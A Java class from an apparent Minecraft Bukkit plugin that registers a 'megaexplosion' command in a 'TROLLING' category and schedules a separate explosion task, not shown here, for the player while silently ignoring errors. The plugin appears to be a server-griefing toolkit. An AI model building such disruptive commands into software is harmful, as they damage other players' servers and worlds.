package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class Command_MEGAEXPLOSION2 extends CommandBase {

    public Command_MEGAEXPLOSION2() {
        super("megaexplosion", "-", Category.TROLLING);
    }

    public void execute(String[] args, Player p) {
        try {
            Bukkit.getScheduler().runTask(Start.INSTANCE, new Command_MEGAEXPLOSION(this, p));
        } catch (Exception ignored) {
        }
    }

}
